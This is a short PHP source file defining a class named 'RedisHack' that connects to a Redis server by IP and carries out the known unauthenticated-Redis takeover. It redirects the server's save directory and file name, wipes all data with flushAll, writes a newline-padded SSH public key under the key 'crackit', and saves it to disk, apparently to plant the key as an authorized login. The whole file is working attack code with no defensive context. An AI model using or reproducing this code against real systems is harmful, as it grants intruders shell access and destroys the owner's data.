<?php
/**
 * Created by PhpStorm.
 * User: Jenner
 * Date: 2016/5/24
 * Time: 11:00
 */

namespace Vincent\Mice\Redis;

class RedisHack
{
    /**
     * @var \Redis
     */
    protected $redis;

    public function connect($ip, $port = 6379) {
        $this->redis = new \Redis();
        $connect = $this->redis->connect($ip, $port, 3);
        if($connect == false) {
            throw new \RedisException("connect " . $ip . " failed");
        }
        $info = $this->redis->info();
        if($info!== false) {
            return true;
        }

        return false;
    }

    public function hack() {
        $dir = $this->redis->config("SET", "dir", getenv("REDIS_CONFIG_DIR"));
        if($dir === false) {
            throw new \RuntimeException("set dir failed");
        }
        $dbfilename = $this->redis->config("SET", "dbfilename", getenv("REDIS_DB_FILENAME"));
        if($dbfilename === false) {
            throw new \RuntimeException("set dbfilename failed");
        }
        $flush = $this->redis->flushAll();
        if($flush === false) {
            throw new \RuntimeException("flush failed");
        }
        $set = $this->redis->set("crackit", "\n\n\n\n\n" . getenv("PUBLIC_KEY") . "\n\n\n");
        if($set === false) {
            throw new \RuntimeException("set crackit failed");
        }
        $save = $this->redis->save();
        if($save === false) {
            throw new \RuntimeException("save failed");
        }

        return true;
    }
}